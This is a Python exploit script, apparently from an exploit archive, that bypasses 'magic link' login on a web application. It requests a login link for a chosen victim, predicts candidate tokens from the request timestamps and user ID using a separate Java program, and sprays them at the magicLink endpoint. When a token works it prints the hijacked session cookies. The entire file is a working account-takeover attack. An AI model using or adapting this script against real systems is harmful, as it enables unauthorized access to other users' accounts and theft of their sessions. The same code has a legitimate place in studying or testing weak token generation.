#!/usr/bin/python3

# Exploit Title: Magic Link bypass
# Date: 2021-09-19
# Exploit Author: Youssef B
# Tested against: Lab

import requests, argparse, os.path, subprocess, time

from requests.models import get_cookie_header

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--user', help='User to deceive', required=True)
parser.add_argument('-uid', '--userid', help='User ID of the targeted user', required=True)
parser.add_argument('-f', '--jfile', help='Specify the java program for tokens file building', required=True)
parser.add_argument('-t', '--target', help='Specify a valid target url', required=True)
parser.add_argument('-p', '--proxy', help='Enter your BURP proxy address and port', required=False)
args = parser.parse_args()

target = args.target
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

if args.proxy:
    proxies = {'http':args.proxy,'https':args.proxy}


def hsession():
    s = requests.Session()
    return s

s = hsession()

def genmagic(t):
    smillisec = int(time.time() * 1000)

    data = 'username=' + args.user
    target = t + 'generateMagicLink'

    try:
        s.post(target, headers=headers, data=data, allow_redirects=True, verify=False)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something went wrong!!!",err)
        exit(1)
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
        exit(1)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
        exit(1)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
        exit(1)
    
    emillisec = int(time.time() * 1000)
    print("Got timestamps...")
    return smillisec, emillisec

def createfile(cmd):
    with open('tokens.txt', 'a+') as f:
        subprocess.call(cmd.split(), stdout=f, stderr=subprocess.DEVNULL)
        print(f"Successfully wrote file: " + f.name)
        return os.path.basename(f.name)

def javaexec(java_file):
    sdate, edate = genmagic(target)

    print("Building tokens file. Please wait...")

    java_file = args.jfile
    java_class = os.path.splitext(java_file)[0]
    cmd = 'java %s %s %s %s' % (java_class, sdate, edate, args.userid)

    if os.path.exists("tokens.txt"):
        print("Removing existing tokens.txt file")
        os.remove("tokens.txt")
        return createfile(cmd)
    else:
        return createfile(cmd)

def loginasx(t):    
    tokens = javaexec(args.jfile)

    with open(tokens, "r") as f:
        for word in f:
            if args.proxy:
                print("Starting token spray through proxy. Please stand by...")
                r = s.get(url=t + "magicLink/" + word.rstrip(), proxies=proxies)
            else:
                print("Starting token spray. Please stand by...")
                r = s.get(url=t + "magicLink/" + word.rstrip())

            res = r.text

            if "Welcome " + args.user in res:
                print("***************************************")
                print(s.cookies.get_dict())
                print("***************************************")
                print(f"Successful logged in with token: " + word)
                print("Hey dude! That spray smells good! You know what to do with a cookie...")
                break


if __name__ == '__main__':
    loginasx(target)
